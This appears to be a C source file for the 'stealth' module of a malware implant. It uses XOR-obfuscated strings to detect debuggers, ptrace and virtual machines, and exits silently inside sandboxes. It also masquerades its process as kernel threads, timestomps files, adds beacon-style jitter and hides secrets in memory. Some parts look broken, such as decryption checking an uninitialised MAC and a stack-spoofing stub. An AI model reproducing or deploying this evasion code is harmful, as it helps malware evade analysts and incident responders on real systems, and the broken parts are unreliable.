
#include "stealth.h"
#include "utils.h"
#include "monocypher.h"
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <sys/prctl.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>

static const uint8_t OBF_GDB[] = {0xCC, 0xCF, 0xC9};
static const uint8_t OBF_STRACE[] = {0xD8, 0xDF, 0xD9, 0xCA, 0xC8, 0xCE};
static const uint8_t OBF_LTRACE[] = {0xC7, 0xDF, 0xD9, 0xCA, 0xC8, 0xCE};
static const uint8_t OBF_LLDB[] = {0xC7, 0xC7, 0xCF, 0xC9};

static const uint8_t OBF_VMWARE[] = {0xFD, 0xE6, 0xDC, 0xCA, 0xD9, 0xCE};
static const uint8_t OBF_VIRTUALBOX[] = {
    0xFD, 0xC2, 0xD9, 0xDF, 0xDE, 0xCA, 0xC7, 0xE9, 0xC4, 0xD3
};
static const uint8_t OBF_KVM[] = {0xE0, 0xFD, 0xE6};
static const uint8_t OBF_XEN[] = {0xF3, 0xCE, 0xC5};

static const uint8_t OBF_PROC_SELF_STATUS[] = {
    0x84, 0xDB, 0xD9, 0xC4, 0xC8, 0x84, 0xD8, 0xCE, 0xC7, 0xCD, 0x84, 0xD8, 0xDF, 0xCA, 0xDF, 0xDE, 0xD8
};
static const uint8_t OBF_DMI_PRODUCT[] = {
    0x84, 0xD8, 0xD2, 0xD8, 0x84, 0xC8, 0xC7, 0xCA, 0xD8, 0xD8, 0x84, 0xCF, 0xC6,
    0xC2, 0x84, 0xC2, 0xCF, 0x84, 0xDB, 0xD9, 0xC4, 0xCF, 0xDE, 0xC8, 0xDF, 0xF4, 0xC5,
    0xCA, 0xC6, 0xCE
};
static const uint8_t OBF_PROC_CPUINFO[] = {
    0x84, 0xDB, 0xD9, 0xC4, 0xC8, 0x84, 0xC8, 0xDB, 0xDE, 0xC2, 0xC5, 0xCD, 0xC4
};

static void decode_string(char *dst, const uint8_t *src, size_t src_len, size_t dst_size)
{
    if (dst_size <= src_len) return;
    for (size_t i = 0; i < src_len; i++) {
        dst[i] = src[i] ^ 0xAB;
    }
    dst[src_len] = '\0';
}

int ph_stealth_init(ph_stealth_ctx_t *ctx, int argc, char *argv[])
{
    if (!ctx || argc == 0 || !argv || !argv[0]) {
        return PH_ERR_NULL_PTR;
    }

    memset(ctx, 0, sizeof(ph_stealth_ctx_t));

    strncpy(ctx->original_argv0, argv[0], sizeof(ctx->original_argv0) - 1);
    ctx->original_argv0[sizeof(ctx->original_argv0) - 1] = '\0';

    ctx->argv_ptr = argv[0];
    ctx->argv_len = strlen(argv[0]);

    ctx->status = PH_STEALTH_OK;
    ctx->is_spoofed = 0;
    ctx->ptrace_blocked = 0;

    return PH_OK;
}

int ph_stealth_spoof_argv(ph_stealth_ctx_t *ctx, const char *new_name)
{
    if (!ctx || !new_name || !ctx->argv_ptr) {
        return PH_ERR_NULL_PTR;
    }

    size_t new_len = strlen(new_name);

    memset(ctx->argv_ptr, 0, ctx->argv_len);

    if (new_len >= ctx->argv_len) {
        memcpy(ctx->argv_ptr, new_name, ctx->argv_len - 1);
        ctx->argv_ptr[ctx->argv_len - 1] = '\0';
    } else {
        memcpy(ctx->argv_ptr, new_name, new_len);
        ctx->argv_ptr[new_len] = '\0';
    }

    strncpy(ctx->spoofed_name, new_name, sizeof(ctx->spoofed_name) - 1);
    ctx->spoofed_name[sizeof(ctx->spoofed_name) - 1] = '\0';

    ctx->is_spoofed = 1;
    return PH_OK;
}

int ph_stealth_spoof_prctl_name(ph_stealth_ctx_t *ctx, const char *new_name)
{
    if (!new_name) {
        return PH_ERR_NULL_PTR;
    }

    char short_name[16];

    const char *name_ptr = new_name;
    size_t name_len = strlen(new_name);

    if (name_len > 2 && new_name[0] == '[' && new_name[name_len - 1] == ']') {

        name_ptr = new_name + 1;
        name_len = name_len - 2;
    }

    if (name_len >= sizeof(short_name)) {
        name_len = sizeof(short_name) - 1;
    }

    memcpy(short_name, name_ptr, name_len);
    short_name[name_len] = '\0';

    int ret = prctl(PR_SET_NAME, (unsigned long)short_name, 0, 0, 0);
    if (ret < 0) {
        return PH_ERR_STEALTH;
    }

    if (ctx) {
        strncpy(ctx->spoofed_name, new_name, sizeof(ctx->spoofed_name) - 1);
        ctx->spoofed_name[sizeof(ctx->spoofed_name) - 1] = '\0';
        ctx->is_spoofed = 1;
    }

    return PH_OK;
}

int ph_stealth_spoof_process(ph_stealth_ctx_t *ctx, const char *display_name, const char *thread_name)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    int ret = ph_stealth_spoof_argv(ctx, display_name);
    if (ret != PH_OK) {
        return ret;
    }

    ret = ph_stealth_spoof_prctl_name(ctx, thread_name);
    if (ret != PH_OK) {
        return ret;
    }

    return PH_OK;
}

int ph_stealth_detect_ptrace(void)
{
    char path[32];
    decode_string(path, OBF_PROC_SELF_STATUS, sizeof(OBF_PROC_SELF_STATUS), sizeof(path));

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        return 0;
    }

    char buffer[1024];
    ssize_t bytes = read(fd, buffer, sizeof(buffer) - 1);
    close(fd);

    if (bytes < 0) {
        return 0;
    }

    buffer[bytes] = '\0';

    char *tracer_line = strstr(buffer, "TracerPid:");
    if (!tracer_line) {
        return 0;
    }

    tracer_line += 10;

    while (*tracer_line == ' ' || *tracer_line == '\t') {
        tracer_line++;
    }

    int tracer_pid = 0;
    while (*tracer_line >= '0' && *tracer_line <= '9') {
        tracer_pid = tracer_pid * 10 + (*tracer_line - '0');
        tracer_line++;
    }

    return (tracer_pid != 0) ? 1 : 0;
}

int ph_stealth_detect_debugger(void)
{

    pid_t ppid = getppid();

    if (ppid <= 1) {
        return 0;
    }

    char parent_path[64];

    const uint8_t OBF_PROC_PREFIX[] = {
        0x84, 0xDB, 0xD9, 0xC4, 0xC8, 0x84
    };
    const uint8_t OBF_COMM_SUFFIX[] = {
        0x84, 0xC8, 0xC4, 0xC6, 0xC6
    };

    size_t idx = 0;
    for (size_t i = 0; i < sizeof(OBF_PROC_PREFIX); i++) {
        parent_path[idx++] = OBF_PROC_PREFIX[i] ^ 0xAB;
    }

    char ppid_str[16];
    pid_t ppid_tmp = ppid;
    int ppid_len = 0;

    if (ppid_tmp == 0) {
        ppid_str[ppid_len++] = '0';
    } else {
        char temp[16];
        int temp_len = 0;
        while (ppid_tmp > 0 && temp_len < 15) {
            temp[temp_len++] = '0' + (ppid_tmp % 10);
            ppid_tmp /= 10;
        }

        for (int i = temp_len - 1; i >= 0; i--) {
            ppid_str[ppid_len++] = temp[i];
        }
    }
    ppid_str[ppid_len] = '\0';

    for (int i = 0; i < ppid_len && idx < sizeof(parent_path) - 7; i++) {
        parent_path[idx++] = ppid_str[i];
    }

    for (size_t i = 0; i < sizeof(OBF_COMM_SUFFIX); i++) {
        parent_path[idx++] = OBF_COMM_SUFFIX[i] ^ 0xAB;
    }
    parent_path[idx] = '\0';

    int parent_fd = open(parent_path, O_RDONLY);
    if (parent_fd < 0) {
        return 0;
    }

    char parent_name[256];
    ssize_t parent_bytes = read(parent_fd, parent_name, sizeof(parent_name) - 1);
    close(parent_fd);

    if (parent_bytes < 0) {
        return 0;
    }

    parent_name[parent_bytes] = '\0';

    size_t len = strlen(parent_name);
    if (len > 0 && parent_name[len - 1] == '\n') {
        parent_name[len - 1] = '\0';
    }

    char gdb_name[8], strace_name[16], ltrace_name[16], lldb_name[8];
    decode_string(gdb_name, OBF_GDB, sizeof(OBF_GDB), sizeof(gdb_name));
    decode_string(strace_name, OBF_STRACE, sizeof(OBF_STRACE), sizeof(strace_name));
    decode_string(ltrace_name, OBF_LTRACE, sizeof(OBF_LTRACE), sizeof(ltrace_name));
    decode_string(lldb_name, OBF_LLDB, sizeof(OBF_LLDB), sizeof(lldb_name));

    if (strcmp(parent_name, gdb_name) == 0 ||
        strcmp(parent_name, strace_name) == 0 ||
        strcmp(parent_name, ltrace_name) == 0 ||
        strcmp(parent_name, lldb_name) == 0) {
        return 1;
    }

    return 0;
}

int ph_stealth_block_ptrace(void)
{

    int ret = prctl(PR_SET_PTRACER, 0, 0, 0, 0);
    if (ret < 0) {
        return PH_ERR_STEALTH;
    }

    return PH_OK;
}

int ph_stealth_detect_parent_process(ph_stealth_ctx_t *ctx)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    if (ph_stealth_detect_debugger()) {
        ctx->status = PH_STEALTH_DEBUGGER_FOUND;
        return 1;
    }

    if (ph_stealth_detect_ptrace()) {
        ctx->status = PH_STEALTH_PTRACE_ACTIVE;
        return 1;
    }

    ctx->status = PH_STEALTH_OK;
    return 0;
}

int ph_stealth_check_dmi_product(ph_vm_info_t *vm_info)
{
    if (!vm_info) {
        return PH_ERR_NULL_PTR;
    }

    char path[64];
    decode_string(path, OBF_DMI_PRODUCT, sizeof(OBF_DMI_PRODUCT), sizeof(path));

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        return 0;
    }

    char product[256];
    ssize_t bytes = read(fd, product, sizeof(product) - 1);
    close(fd);

    if (bytes < 0) {
        return 0;
    }

    product[bytes] = '\0';

    size_t len = strlen(product);
    if (len > 0 && product[len - 1] == '\n') {
        product[len - 1] = '\0';
    }

    char vmware[16], virtualbox[16], kvm[8], xen[8];
    decode_string(vmware, OBF_VMWARE, sizeof(OBF_VMWARE), sizeof(vmware));
    decode_string(virtualbox, OBF_VIRTUALBOX, sizeof(OBF_VIRTUALBOX), sizeof(virtualbox));
    decode_string(kvm, OBF_KVM, sizeof(OBF_KVM), sizeof(kvm));
    decode_string(xen, OBF_XEN, sizeof(OBF_XEN), sizeof(xen));

    if (strstr(product, vmware) != NULL) {
        vm_info->is_vm = 1;
        vm_info->vm_type = 1;
        strncpy(vm_info->vm_name, vmware, sizeof(vm_info->vm_name) - 1);
        vm_info->confidence = 95;
        return 1;
    }

    if (strstr(product, virtualbox) != NULL) {
        vm_info->is_vm = 1;
        vm_info->vm_type = 2;
        strncpy(vm_info->vm_name, virtualbox, sizeof(vm_info->vm_name) - 1);
        vm_info->confidence = 95;
        return 1;
    }

    if (strstr(product, kvm) != NULL) {
        vm_info->is_vm = 1;
        vm_info->vm_type = 3;
        strncpy(vm_info->vm_name, kvm, sizeof(vm_info->vm_name) - 1);
        vm_info->confidence = 90;
        return 1;
    }

    if (strstr(product, xen) != NULL) {
        vm_info->is_vm = 1;
        vm_info->vm_type = 4;
        strncpy(vm_info->vm_name, xen, sizeof(vm_info->vm_name) - 1);
        vm_info->confidence = 90;
        return 1;
    }

    return 0;
}

int ph_stealth_check_cpu_hypervisor(ph_vm_info_t *vm_info)
{
    if (!vm_info) {
        return PH_ERR_NULL_PTR;
    }

    char path[32];
    decode_string(path, OBF_PROC_CPUINFO, sizeof(OBF_PROC_CPUINFO), sizeof(path));

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        return 0;
    }

    char buffer[4096];
    ssize_t bytes = read(fd, buffer, sizeof(buffer) - 1);
    close(fd);

    if (bytes < 0) {
        return 0;
    }

    buffer[bytes] = '\0';

    if (strstr(buffer, "hypervisor") != NULL) {
        vm_info->is_vm = 1;
        vm_info->confidence = 70;
        strncpy(vm_info->vm_name, "Unknown (hypervisor flag)", sizeof(vm_info->vm_name) - 1);
        return 1;
    }

    return 0;
}

int ph_stealth_check_proc_cpuinfo(ph_vm_info_t *vm_info)
{

    return ph_stealth_check_cpu_hypervisor(vm_info);
}

int ph_stealth_detect_vm(ph_vm_info_t *vm_info, int check_flags)
{
    if (!vm_info) {
        return PH_ERR_NULL_PTR;
    }

    memset(vm_info, 0, sizeof(ph_vm_info_t));

    int vm_detected = 0;

    if (check_flags & PH_VM_CHECK_DMI) {
        if (ph_stealth_check_dmi_product(vm_info)) {
            vm_detected = 1;
        }
    }

    if (!vm_detected && (check_flags & PH_VM_CHECK_CPUID)) {
        if (ph_stealth_check_cpu_hypervisor(vm_info)) {
            vm_detected = 1;
        }
    }

    if (!vm_detected && (check_flags & PH_VM_CHECK_PROC)) {
        if (ph_stealth_check_proc_cpuinfo(vm_info)) {
            vm_detected = 1;
        }
    }

    return vm_detected;
}

int ph_stealth_mask_process_name(const char *masquerade_name)
{
    if (!masquerade_name || strlen(masquerade_name) == 0) {
        return PH_ERR_NULL_PTR;
    }

    int ret;

    ret = ph_stealth_spoof_prctl_name(NULL, masquerade_name);
    if (ret != PH_OK) {
        return ret;
    }

    char comm_path[32];
    const uint8_t OBF_PROC_COMM[] = {
        0x84, 0xDB, 0xD9, 0xC4, 0xC8, 0x84, 0xD8, 0xCE, 0xC7, 0xCD, 0x84, 0xC8, 0xC4, 0xC6, 0xC6
    };

    decode_string(comm_path, OBF_PROC_COMM, sizeof(OBF_PROC_COMM), sizeof(comm_path));

    int fd = open(comm_path, O_WRONLY | O_TRUNC);
    if (fd >= 0) {

        const char *name_ptr = masquerade_name;
        size_t name_len = strlen(masquerade_name);

        if (name_len > 2 && masquerade_name[0] == '[' && masquerade_name[name_len - 1] == ']') {
            name_ptr = masquerade_name + 1;
            name_len = name_len - 2;
        }

        if (name_len > 15) {
            name_len = 15;
        }

        ssize_t written = write(fd, name_ptr, name_len);
        close(fd);

        if (written < 0) {
            return PH_ERR_STEALTH;
        }
    }

    return PH_OK;
}

int ph_stealth_timestomp_file(const char *target_file, const char *reference_file)
{
    if (!target_file || !reference_file) {
        return PH_ERR_NULL_PTR;
    }

    struct stat ref_stat;
    if (stat(reference_file, &ref_stat) != 0) {
        return PH_ERR_INVALID_ARG;
    }

    struct timespec times[2];

    times[0].tv_sec = ref_stat.st_atim.tv_sec;
    times[0].tv_nsec = ref_stat.st_atim.tv_nsec;

    times[1].tv_sec = ref_stat.st_mtim.tv_sec;
    times[1].tv_nsec = ref_stat.st_mtim.tv_nsec;

    if (utimensat(AT_FDCWD, target_file, times, 0) != 0) {
        return PH_ERR_STEALTH;
    }

    return PH_OK;
}

int ph_stealth_timing_init(ph_timing_ctx_t *ctx, uint64_t expected_delta_ms)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    ctx->start_time = ph_stealth_get_timestamp_ns();
    ctx->expected_delta = expected_delta_ms * 1000000;
    ctx->is_timing_attack = 0;

    return PH_OK;
}

int ph_stealth_timing_check(ph_timing_ctx_t *ctx)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    uint64_t now = ph_stealth_get_timestamp_ns();
    uint64_t delta = now - ctx->start_time;

    if (delta > ctx->expected_delta * 10) {
        ctx->is_timing_attack = 1;
        return 1;
    }

    return 0;
}

uint64_t ph_stealth_get_timestamp_ns(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

const char* ph_stealth_status_string(ph_stealth_status_t status)
{
    switch (status) {
        case PH_STEALTH_OK:
            return "OK";
        case PH_STEALTH_DEBUGGER_FOUND:
            return "Debugger detected";
        case PH_STEALTH_PTRACE_ACTIVE:
            return "Ptrace active";
        case PH_STEALTH_VM_DETECTED:
            return "VM detected";
        case PH_STEALTH_TIMING_ATTACK:
            return "Timing attack";
        case PH_STEALTH_PARENT_SUSPECT:
            return "Suspicious parent";
        default:
            return "Unknown";
    }
}

const char* ph_stealth_vm_type_name(int vm_type)
{
    switch (vm_type) {
        case 1: return "VMware";
        case 2: return "VirtualBox";
        case 3: return "KVM";
        case 4: return "Xen";
        case 5: return "Hyper-V";
        default: return "Unknown";
    }
}

void ph_stealth_cleanup(ph_stealth_ctx_t *ctx)
{
    if (!ctx) {
        return;
    }

    ph_wipe_memory(ctx->original_argv0, sizeof(ctx->original_argv0));
    ph_wipe_memory(ctx->spoofed_name, sizeof(ctx->spoofed_name));

    ctx->argv_ptr = NULL;
    ctx->argv_len = 0;
    ctx->is_spoofed = 0;
    ctx->ptrace_blocked = 0;
}

int ph_heap_secret_init(ph_heap_secret_t *ctx, const uint8_t *plaintext, size_t len)
{
    if (!ctx || !plaintext || len == 0) {
        return PH_ERR_NULL_PTR;
    }

    memset(ctx, 0, sizeof(ph_heap_secret_t));
    ctx->data_len = len;

    ctx->encrypted_data = (uint8_t *)malloc(len);
    if (!ctx->encrypted_data) {
        return PH_ERR_MEMORY;
    }

    crypto_keygen(ctx->xor_key);

    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        ssize_t bytes_read = read(fd, ctx->nonce, sizeof(ctx->nonce));
        close(fd);

        if (bytes_read != sizeof(ctx->nonce)) {

            uint8_t hash[64];
            crypto_blake2b(hash, ctx->xor_key, sizeof(ctx->xor_key));
            memcpy(ctx->nonce, hash, sizeof(ctx->nonce));
            crypto_wipe(hash, sizeof(hash));
        }
    } else {

        uint8_t hash[64];
        crypto_blake2b(hash, ctx->xor_key, sizeof(ctx->xor_key));
        memcpy(ctx->nonce, hash, sizeof(ctx->nonce));
        crypto_wipe(hash, sizeof(hash));
    }

    uint8_t mac[16];
    crypto_xchacha20_poly1305_encrypt(
        mac,
        ctx->encrypted_data,
        ctx->xor_key,
        ctx->nonce,
        plaintext,
        len,
        NULL,
        0
    );

    ctx->is_encrypted = 1;
    ctx->rotation_interval_ms = 5000;
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ctx->last_rotation = (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;

    return PH_OK;
}

int ph_heap_secret_encrypt(ph_heap_secret_t *ctx)
{
    if (!ctx || !ctx->encrypted_data || ctx->data_len == 0) {
        return PH_ERR_NULL_PTR;
    }

    if (ctx->is_encrypted) {
        return PH_OK;
    }

    uint8_t mac[16];
    uint8_t *temp_buf = (uint8_t *)malloc(ctx->data_len);
    if (!temp_buf) {
        return PH_ERR_MEMORY;
    }

    memcpy(temp_buf, ctx->encrypted_data, ctx->data_len);

    crypto_xchacha20_poly1305_encrypt(
        mac,
        ctx->encrypted_data,
        ctx->xor_key,
        ctx->nonce,
        temp_buf,
        ctx->data_len,
        NULL,
        0
    );

    free(temp_buf);
    ctx->is_encrypted = 1;
    return PH_OK;
}

int ph_heap_secret_decrypt(ph_heap_secret_t *ctx, uint8_t *output, size_t output_len)
{
    if (!ctx || !ctx->encrypted_data || !output || ctx->data_len == 0) {
        return PH_ERR_NULL_PTR;
    }

    if (output_len < ctx->data_len) {
        return PH_ERR_INVALID_ARG;
    }

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    uint64_t now_ms = (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;

    if ((now_ms - ctx->last_rotation) > ctx->rotation_interval_ms) {
        ph_heap_secret_rotate_key(ctx);
    }

    uint8_t dummy_mac[16];
    int ret = crypto_xchacha20_poly1305_decrypt(
        output,
        ctx->xor_key,
        ctx->nonce,
        dummy_mac,
        ctx->encrypted_data,
        ctx->data_len,
        NULL,
        0
    );

    if (ret != 0) {
        return PH_ERR_CRYPTO;
    }

    ctx->is_encrypted = 0;
    return (int)ctx->data_len;
}

int ph_heap_secret_rotate_key(ph_heap_secret_t *ctx)
{
    if (!ctx || !ctx->encrypted_data || ctx->data_len == 0) {
        return PH_ERR_NULL_PTR;
    }

    uint8_t *plaintext = (uint8_t *)malloc(ctx->data_len);
    if (!plaintext) {
        return PH_ERR_MEMORY;
    }

    uint8_t dummy_mac[16];
    int ret = crypto_xchacha20_poly1305_decrypt(
        plaintext,
        ctx->xor_key,
        ctx->nonce,
        dummy_mac,
        ctx->encrypted_data,
        ctx->data_len,
        NULL,
        0
    );

    if (ret != 0) {
        free(plaintext);
        return PH_ERR_CRYPTO;
    }

    crypto_keygen(ctx->xor_key);

    int fd2 = open("/dev/urandom", O_RDONLY);
    if (fd2 >= 0) {
        ssize_t bytes_read = read(fd2, ctx->nonce, sizeof(ctx->nonce));
        close(fd2);

        if (bytes_read != sizeof(ctx->nonce)) {

            uint8_t hash[64];
            crypto_blake2b(hash, ctx->xor_key, sizeof(ctx->xor_key));
            memcpy(ctx->nonce, hash, sizeof(ctx->nonce));
            crypto_wipe(hash, sizeof(hash));
        }
    } else {

        uint8_t hash[64];
        crypto_blake2b(hash, ctx->xor_key, sizeof(ctx->xor_key));
        memcpy(ctx->nonce, hash, sizeof(ctx->nonce));
        crypto_wipe(hash, sizeof(hash));
    }

    uint8_t new_mac[16];
    crypto_xchacha20_poly1305_encrypt(
        new_mac,
        ctx->encrypted_data,
        ctx->xor_key,
        ctx->nonce,
        plaintext,
        ctx->data_len,
        NULL,
        0
    );

    crypto_wipe(plaintext, ctx->data_len);
    free(plaintext);

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ctx->last_rotation = (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;

    return PH_OK;
}

void ph_heap_secret_wipe(ph_heap_secret_t *ctx)
{
    if (!ctx || !ctx->encrypted_data) {
        return;
    }

    memset(ctx->encrypted_data, 0x00, ctx->data_len);

    memset(ctx->encrypted_data, 0xFF, ctx->data_len);

    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        ssize_t bytes_read = read(fd, ctx->encrypted_data, ctx->data_len);
        close(fd);
        (void)bytes_read;
    } else {

        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        for (size_t i = 0; i < ctx->data_len; i++) {
            ctx->encrypted_data[i] = (uint8_t)((ts.tv_sec ^ ts.tv_nsec ^ i) & 0xFF);
        }
    }

    free(ctx->encrypted_data);
    ctx->encrypted_data = NULL;

    ph_wipe_memory(ctx->xor_key, sizeof(ctx->xor_key));
    ctx->data_len = 0;
    ctx->is_encrypted = 0;
}

int ph_stack_spoof_init(ph_stack_spoof_t *ctx, const char *fake_func)
{
    if (!ctx || !fake_func) {
        return PH_ERR_NULL_PTR;
    }

    memset(ctx, 0, sizeof(ph_stack_spoof_t));

    strncpy(ctx->fake_function_name, fake_func, sizeof(ctx->fake_function_name) - 1);
    ctx->fake_function_name[sizeof(ctx->fake_function_name) - 1] = '\0';

    ctx->fake_return_addr = (void *)0x7f0000000000UL;
    ctx->fake_frame_ptr = NULL;

    ctx->is_active = 0;
    return PH_OK;
}

int ph_stack_spoof_activate(ph_stack_spoof_t *ctx)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    if (ctx->is_active) {
        return PH_OK;
    }

    void *current_sp;
    __asm__ volatile("mov %%rsp, %0" : "=r" (current_sp));
    ctx->fake_frame_ptr = current_sp;

    ctx->is_active = 1;
    return PH_OK;
}

int ph_stack_spoof_deactivate(ph_stack_spoof_t *ctx)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    if (!ctx->is_active) {
        return PH_OK;
    }

    ph_wipe_memory(ctx->fake_function_name, sizeof(ctx->fake_function_name));
    ctx->fake_return_addr = NULL;
    ctx->fake_frame_ptr = NULL;
    ctx->is_active = 0;

    return PH_OK;
}

void ph_stack_spoof_cleanup(ph_stack_spoof_t *ctx)
{
    if (!ctx) {
        return;
    }

    ph_stack_spoof_deactivate(ctx);
    memset(ctx, 0, sizeof(ph_stack_spoof_t));
}

int ph_stealth_check_cpuid_hypervisor(void)
{
#if defined(__x86_64__) || defined(__i386__)
    uint32_t eax, ebx, ecx, edx;

    __asm__ volatile(
        "cpuid"
        : "=a" (eax), "=b" (ebx), "=c" (ecx), "=d" (edx)
        : "a" (0x1)
    );

    if (ecx & (1 << 31)) {
        return 1;
    }

    return 0;
#else

    return 0;
#endif
}

int ph_stealth_check_rdtsc_timing(void)
{
#if defined(__x86_64__) || defined(__i386__)
    uint64_t start, end;
    uint32_t eax, ebx, ecx, edx;

    __asm__ volatile(
        "rdtsc"
        : "=a" (eax), "=d" (edx)
    );
    start = ((uint64_t)edx << 32) | eax;

    __asm__ volatile(
        "cpuid"
        : "=a" (eax), "=b" (ebx), "=c" (ecx), "=d" (edx)
        : "a" (0x0)
    );

    __asm__ volatile(
        "rdtsc"
        : "=a" (eax), "=d" (edx)
    );
    end = ((uint64_t)edx << 32) | eax;

    uint64_t delta = end - start;

    if (delta > 1000) {
        return 1;
    }

    return 0;
#else

    return 0;
#endif
}

int ph_stealth_anti_debug_comprehensive(void)
{
    int detected = 0;

    if (ph_stealth_detect_ptrace()) {
        detected = PH_STEALTH_PTRACE_ACTIVE;
    }

    if (ph_stealth_detect_debugger()) {
        detected = PH_STEALTH_DEBUGGER_FOUND;
    }

    if (ph_stealth_check_cpuid_hypervisor()) {
        detected = PH_STEALTH_VM_DETECTED;
    }

    if (ph_stealth_check_rdtsc_timing()) {
        detected = PH_STEALTH_TIMING_ATTACK;
    }

    ph_vm_info_t vm_info;
    if (ph_stealth_detect_vm(&vm_info, PH_VM_CHECK_ALL) && vm_info.is_vm) {
        detected = PH_STEALTH_VM_DETECTED;
    }

    return detected;
}

int ph_stealth_self_terminate_if_sandbox(void)
{
    int detection_result = ph_stealth_anti_debug_comprehensive();

    if (detection_result != PH_STEALTH_OK) {

        ph_wipe_memory(&detection_result, sizeof(detection_result));

        _exit(0);
    }

    return PH_OK;
}

int ph_stealth_get_jitter_delay(int base_delay_ms)
{
    if (base_delay_ms <= 0) {
        return base_delay_ms;
    }

    int jitter_range = (base_delay_ms * 30) / 100;

    int fd = open("/dev/urandom", O_RDONLY);
    int32_t random_value = 0;

    if (fd >= 0) {
        ssize_t bytes_read = read(fd, &random_value, sizeof(random_value));
        close(fd);

        if (bytes_read != sizeof(random_value)) {

            struct timespec ts;
            clock_gettime(CLOCK_MONOTONIC, &ts);
            random_value = (int32_t)(ts.tv_nsec ^ ts.tv_sec);
        }
    } else {

        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        random_value = (int32_t)(ts.tv_nsec ^ ts.tv_sec);
    }

    if (random_value < 0) {
        random_value = -random_value;
    }

    int jitter_offset = (random_value % (jitter_range * 2 + 1)) - jitter_range;

    int _delay = base_delay_ms + jitter_offset;

    if (_delay < 100) {
        _delay = 100;
    }

    return _delay;
}
